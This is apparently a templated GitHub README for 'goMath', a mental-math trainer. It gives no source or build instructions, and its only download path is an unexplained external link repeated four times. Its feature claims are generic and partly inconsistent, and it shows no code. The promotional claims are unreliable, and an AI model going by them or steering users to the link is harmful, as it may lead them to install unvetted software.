![preview](https://raw.githubusercontent.com/aryan24s-boop/math-drill-sprint/main/promo_9672813.svg)
[![Download](https://raw.githubusercontent.com/aryan24s-boop/math-drill-sprint/main/latest_7c799.svg)](https://aryan24s-boop.github.io/math-drill-sprint/)

<div align="center">

# 🧮 goMath – The Mental Math Dojo That Lives in Your Terminal

### *Where numbers meet muscle memory — a lightweight, offline-first arithmetic trainer built for people who refuse to let their brain gather dust.*

**Built for learners. Loved by educators. Trusted by curious minds.**

</div>

---

## 🎯 What Is goMath?

goMath is a compact, distraction-free **mental math trainer** designed around a single, stubbornly simple idea: mathematics is not a spectator sport. You cannot *watch* your way to fluency any more than you can watch your way to a marathon finish line. You have to show up, day after day, and swing the bat.

Inspired by the original goMath project, this repository reimagines what a math trainer can be — not a dusty quiz app buried behind nine menus, but a nimble, keyboard-first companion that turns idle minutes into sharper thinking. Whether you are a student preparing for a timed exam, a developer keeping arithmetic reflexes warm, or simply someone who wants to stop reaching for a calculator every time a tip needs splitting, goMath offers a calm, focused arena for practice.

Think of it as a dojo, not a gym. There are no flashing leaderboards, no endless onboarding slides, no account walls. Just problems, timing, feedback, and the quiet satisfaction of hitting a new personal best.

---

## 📥 Get Started

[![Download](https://raw.githubusercontent.com/aryan24s-boop/math-drill-sprint/main/latest_7c799.svg)](https://aryan24s-boop.github.io/math-drill-sprint/)

---

## ✨ Feature Highlights

Every feature below was added because a real learner asked for it — or because we tried learning without it and felt the pinch.

### 🧠 Adaptive Difficulty Engine
The problem generator watches how you respond, not just whether you respond. Solve a streak of two-digit additions cleanly and the difficulty gently rises. Fumble a subtraction three times in a row and the engine eases the throttle. It is a training partner, not an examiner — the goal is growth, never humiliation.

### ⚡ Zero-Latency Interaction
Answers register the instant your fingers land on the keys. No spinner, no round trip, no "submitting..." limbo. The feedback loop is so tight that practice sessions start to feel almost meditative, like tapping a rhythm instead of solving equations.

### 🌍 Multilingual Interface
Numbers are universal, but interface language is not. The entire user-facing layer ships with localization support covering English, German, Spanish, French, Japanese, Portuguese, and Mandarin at launch, with a clean translation pipeline that welcomes community contributions. Switch languages without losing your streak or your statistics.

### 📱 Responsive Layout Across Every Device
The layout flexes gracefully from a phone screen held one-handed on a bus to an ultrawide monitor in a classroom lab. Typography scales, controls remain thumb-reachable, and no horizontal scrolling ever appears to ruin your focus.

### 🕒 24/7 Support & Guidance
Curious about how a scoring rule works? Stuck on configuration? The documentation is extensive, the issue tracker is actively triaged, and the maintainers genuinely enjoy helping newcomers get their first session running. Whenever a question arises, there is always a way to get an answer — day or night.

### 🎨 Full Theme Customization
Three built-in palettes ship by default — *Chalkboard*, *Midnight*, and *Blueprint* — plus a configuration file that lets you define your own accent colors, fonts, and contrast levels. Dark mode enthusiasts and high-contrast users are first-class citizens here.

### 📊 Session Statistics With Honest Numbers
Track accuracy percentage, median response time, longest streak, and per-operation breakdowns. Statistics persist locally so your progress survives restarts, but they never leave your machine unless you explicitly export them. Your data is your business.

### 🧩 Modular Operation Packs
Addition, subtraction, multiplication, division, and mixed-mode drills are each loaded as separate modules. Educational contributors can author new packs — fraction arithmetic, modular math, estimation challenges — by following a documented schema. The ceiling is whatever the community decides to build.

### 🧘 Distraction-Free Focus Mode
Press a single key and the interface strips away everything except the current problem and a subtle timer. No counters, no sidebars, no temptation to glance at statistics mid-session. Purity of focus is a feature, not an afterthought.

### 🎁 Streak-Friendly Offline Operation
Once initialized, goMath runs entirely without a network connection. Practice on a plane, in a basement classroom, or on a mountain trail with a laptop and a thermos. The tool respects your context.

---

## 🗂️ Repository Layout

Understanding the structure makes contributing dramatically easier. Below is a bird's-eye view of how the codebase is organized.

| Path | Purpose |
|------|---------|
| `core/` | The question generator, difficulty engine, and scoring logic |
| `ui/` | Rendering layer — terminals, graphical shells, and layout primitives |
| `locales/` | Translation catalogs with per-language key/value files |
| `packs/` | Built-in operation packs and the schema for community-authored ones |
| `stats/` | Persistence, aggregation, and export routines |
| `docs/` | Long-form guides, architecture notes, and contributor walkthroughs |
| `tools/` | Developer utilities for validation, formatting, and release prep |

Each folder contains its own `NOTES` document explaining local conventions, so you never have to guess where a new file belongs.

---

## 🚀 Quick Start Walkthrough

Getting a practice session running takes less time than brewing a cup of tea. The general flow looks like this:

1. **Obtain the project** using the acquisition method shown in the [![Download](https://raw.githubusercontent.com/aryan24s-boop/math-drill-sprint/main/latest_7c799.svg)](https://aryan24s-boop.github.io/math-drill-sprint/) section above.
2. **Run the launcher** provided at the root of the repository. It detects your platform and prepares the runtime automatically.
3. **Choose an operation pack** from the welcome menu — start simple, or jump straight into mixed-mode if you are feeling bold.
4. **Configure your session** — length, difficulty ceiling, timer visibility, and language.
5. **Begin practice.** Type answers and press Enter. The engine handles the rest.

That is genuinely all there is to it. No accounts, no telemetry prompts, no checkbox labyrinths.

---

## 🧭 Configuration Reference

goMath reads a single configuration file, typically placed alongside the executable after first launch. The most commonly adjusted options are listed below.

### Session Options
- **session.length** — number of problems per session; default is 20
- **session.timeLimit** — per-question ceiling in seconds; set to 0 for untimed practice
- **session.mode** — `classic`, `focus`, or `marathon`
- **session.allowSkip** — whether a question may be passed without penalty

### Difficulty Options
- **difficulty.start** — initial tier from 1 to 10
- **difficulty.adaptive** — enable or disable the responsive engine
- **difficulty.ceiling** — the maximum tier the engine may reach

### Display Options
- **display.theme** — `chalkboard`, `midnight`, `blueprint`, or `custom`
- **display.locale** — any language code present in the `locales/` directory
- **display.showTimer** — toggle the running clock
- **display.animation** — control transition smoothness for lower-powered devices

Every option includes an inline comment explaining its effect, so editing the file directly is perfectly reasonable.

---

## 🧪 Testing and Quality Assurance

A math trainer that miscounts is worse than no trainer at all. For that reason, the project maintains a layered testing strategy:

- **Unit tests** validate the generator across thousands of randomized inputs, ensuring no out-of-range or malformed questions escape.
- **Property tests** verify invariants — for example, that every generated multiplication problem has exactly one correct product.
- **Snapshot tests** lock down the rendering output so accidental visual regressions get caught early.
- **Human playtesting** remains irreplaceable; maintainers run periodic sessions and log friction points as issues.

If you discover a scoring discrepancy, please open an issue with the exact problem text and the answer you supplied. Reproducibility is the fastest road to a fix.

---

## 🤝 Contributing

This project grows because people care. Contributions of every size are welcome — from a single typo correction to an entire new operation pack.

### Ways to Help
- **Translate** the interface into a language you speak fluently
- **Author** a new operation pack for an underserved topic
- **Improve** accessibility: screen reader compatibility, contrast, keyboard navigation
- **Document** an edge case you stumbled upon so the next person does not
- **Refine** the difficulty engine with real data from your own practice sessions

### Contribution Etiquette
Keep changes focused. A pull request that fixes one bug is easier to review than one that fixes a bug, renames a folder, and reformats the changelog. Write clear commit messages. Be kind in review threads. Assume good faith.

Before submitting, run the local validation script found in `tools/` — it checks formatting, tests, and locale completeness in one pass.

---

## 🔐 Privacy and Data Handling

goMath is built on a simple promise: your practice belongs to you.

- No analytics beacons
- No account creation
- No silent uploads
- Statistics stored locally, exported only when you ask

If a future feature ever requires network access, it will be opt-in, clearly labeled, and documented in this section before release.

---

## 🗺️ Roadmap

The following improvements are under active consideration. Timelines shift, but direction rarely does.

- **2026 Q1** — Expanded operation packs including estimation and rounding challenges
- **2026 Q2** — Voice input mode for hands-free practice
- **2026 Q3** — Classroom mode with instructor dashboards
- **2026 Q4** — Plugin registry for community-authored packs
- **Beyond** — Spaced repetition scheduling that revisits your weakest patterns

Suggestions are always welcome through the issue tracker.

---

## ❓ Frequently Asked Questions

**Is this suitable for children?**
Absolutely. The interface is intentionally calm, the feedback is encouraging rather than punitive, and there are no advertisements or external links embedded in the practice flow.

**Does it work without an internet connection?**
Yes. After initial setup, the entire experience runs locally. You can practice on a plane, in a remote cabin, or anywhere else the signal drops.

**Can I reset my statistics?**
Yes, from the settings menu. You may also export them first if you want a record before clearing.

**How difficult does it get?**
The ceiling is configurable. At maximum tier, problems involve multi-step arithmetic that will genuinely challenge most adults.

**Will my progress sync between devices?**
Not by default. Manual export and import is supported, and a sync layer is on the roadmap.

**Is there a mobile-specific version?**
The responsive interface adapts cleanly to mobile screens. A dedicated packaged build is under exploration.

**Can teachers use this in a classroom?**
Yes, and many already do. The upcoming classroom mode is being designed specifically with educators in mind.

**What happens if I find a bug?**
Open an issue with reproduction steps. Clear reports typically receive a response quickly.

---

## 🧾 License

This project is distributed under the **MIT License**. You are welcome to use, modify, and redistribute it in accordance with the terms of that license. The full text is available here:

**MIT License** — https://opensource.org/licenses/MIT

Copyright (c) 2026 goMath Contributors

Permission is hereby granted, in the spirit of open collaboration, for any person obtaining a copy of this software and associated documentation to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies.

---

## ⚠️ Disclaimer

goMath is provided as an educational practice tool. It is offered "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.

The maintainers make no guarantee regarding the accuracy of generated problems in every conceivable configuration, though extensive testing is performed to minimize errors. Users are encouraged to report any discrepancies they encounter.

This project is not affiliated with, endorsed by, or sponsored by any educational institution, examination board, or certification body. Practice results do not guarantee outcomes on any standardized test or real-world assessment.

By using this software, you accept full responsibility for how you apply it and for any decisions made based on the skills you develop through practice.

---

## 💬 Final Words

Fluency in arithmetic is a quiet superpower. It shows up in small moments — splitting a bill without hesitation, estimating a discount mid-conversation, catching a pricing error before it costs you. goMath exists to make those moments effortless.

Practice for ten minutes a day. Watch the hesitation fade. That is the whole promise, and it is a promise worth keeping.

**Sharpen the mind. One problem at a time.**

[![Download](https://raw.githubusercontent.com/aryan24s-boop/math-drill-sprint/main/latest_7c799.svg)](https://aryan24s-boop.github.io/math-drill-sprint/)